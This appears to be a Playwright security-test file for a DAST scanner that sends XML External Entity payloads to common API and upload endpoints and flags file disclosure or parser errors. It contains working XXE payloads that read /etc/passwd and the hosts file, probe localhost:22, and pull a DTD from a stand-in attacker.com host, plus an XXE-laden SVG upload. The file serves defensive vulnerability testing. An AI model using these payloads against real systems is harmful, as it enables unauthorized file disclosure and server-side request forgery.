import { test, expect } from '@playwright/test';
import { DASTReporter } from '../utils/helpers';

const reporter = new DASTReporter();

const xxePayloads = [
  `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>`,
  `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts" >
]>
<foo>&xxe;</foo>`,
  `<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://localhost:22" >
]>
<foo>&xxe;</foo>`,
  `<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>`,
  `<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<root/>`,
  // Parameter entity variant (blind XXE)
  `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<data/>`,
];

const xxeErrorPatterns = [
  /XMLReader/i,
  /xmlParseEntityRef/i,
  /DOCTYPE/i,
  /ENTITY/i,
  /xmlParseStartTag/i,
  /xmlParseElementStart/i,
  /libxml/i,
  /SAXParseException/i,
  /XmlException/i,
  /DocumentBuilder/i,
  /TransformerFactory/i,
  /SAXParser/i,
];

test.describe('XXE (XML External Entity) Tests', () => {
  test('Check for XXE in XML endpoints', async ({ request }) => {
    const xmlEndpoints = [
      '/api/xml',
      '/api/soap',
      '/api/upload',
      '/api/import',
      '/api/process',
      '/soap',
      '/xmlrpc',
      '/api/v1/xml',
    ];
    
    for (const endpoint of xmlEndpoints) {
      for (const payload of xxePayloads) {
        try {
          const response = await request.post(endpoint, {
            data: payload,
            headers: {
              'Content-Type': 'application/xml',
              'Accept': 'application/xml',
            },
            timeout: 10000,
          });
          
          const body = await response.text();
          
          // Check for file content disclosure
          const fileIndicators = [
            'root:x:',
            'daemon:x:',
            'bin:x:',
            'Windows IP Configuration',
            'hosts',
            'localhost',
          ];
          
          for (const indicator of fileIndicators) {
            if (body.includes(indicator)) {
              reporter.addFinding({
                severity: 'critical',
                title: 'XXE Vulnerability - File Disclosure',
                description: `XXE vulnerability allows file system access via "${endpoint}"`,
                url: endpoint,
                payload,
                evidence: `Found in response: ${indicator}`,
                cwe: 'CWE-611',
                owasp: 'A05:2021 - Security Misconfiguration',
                recommendation: 'Disable external entity processing in XML parser configuration',
              });
              break;
            }
          }
          
          // Check for XML error messages
          for (const pattern of xxeErrorPatterns) {
            if (pattern.test(body)) {
              reporter.addFinding({
                severity: 'high',
                title: 'Potential XXE Vulnerability',
                description: `XML parsing error indicates XXE may be possible at "${endpoint}"`,
                url: endpoint,
                payload,
                evidence: `Error pattern: ${pattern}`,
                cwe: 'CWE-611',
                owasp: 'A05:2021 - Security Misconfiguration',
                recommendation: 'Disable DTD processing and external entities in XML parsers',
              });
              break;
            }
          }
        } catch (e) {
          // Continue
        }
      }
    }
  });

  test('Check for XXE in file uploads', async ({ request }) => {
    // Test SVG file upload for XXE
    const svgWithXxe = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="20">&xxe;</text>
</svg>`;

    const uploadEndpoints = ['/upload', '/api/upload', '/api/import', '/files'];
    
    for (const endpoint of uploadEndpoints) {
      try {
        const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2);
        const body = [
          `------${boundary}`,
          `Content-Disposition: form-data; name="file"; filename="test.svg"`,
          `Content-Type: image/svg+xml`,
          ``,
          svgWithXxe,
          `------${boundary}--`,
        ].join('\r\n');
        
        const response = await request.post(endpoint, {
          data: body,
          headers: {
            'Content-Type': `multipart/form-data; boundary=----${boundary}`,
          },
          timeout: 15000,
        });
        
        const responseBody = await response.text();
        
        // Check for file content in response
        if (responseBody.includes('root:x:') || responseBody.includes('daemon:x:')) {
          reporter.addFinding({
            severity: 'critical',
            title: 'XXE via SVG Upload',
            description: `SVG file upload at "${endpoint}" is vulnerable to XXE`,
            url: endpoint,
            evidence: 'File content disclosed in response',
            cwe: 'CWE-611',
            owasp: 'A05:2021 - Security Misconfiguration',
            recommendation: 'Sanitize uploaded SVG files or disable external entities in XML parser',
          });
        }
      } catch (e) {
        // Continue
      }
    }
  });

  test('Check for XXE in content negotiation', async ({ request }) => {
    // Some APIs accept XML based on Content-Type header
    const xxePayload = `<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>`;

    const jsonEndpoints = ['/api/data', '/api/users', '/api/items', '/graphql'];
    
    for (const endpoint of jsonEndpoints) {
      try {
        // Try with XML content type on JSON endpoint
        const response = await request.post(endpoint, {
          data: xxePayload,
          headers: {
            'Content-Type': 'application/xml',
            'Accept': 'application/json',
          },
          timeout: 10000,
        });
        
        const body = await response.text();
        
        if (body.includes('root:x:') || body.includes('DOCTYPE') || body.includes('xmlParse')) {
          reporter.addFinding({
            severity: 'high',
            title: 'XXE via Content Negotiation',
            description: `Endpoint "${endpoint}" accepts XML input and may be vulnerable to XXE`,
            url: endpoint,
            evidence: body.substring(0, 200),
            cwe: 'CWE-611',
            owasp: 'A05:2021 - Security Misconfiguration',
            recommendation: 'Explicitly reject unexpected content types',
          });
        }
      } catch (e) {
        // Continue
      }
    }
  });
});
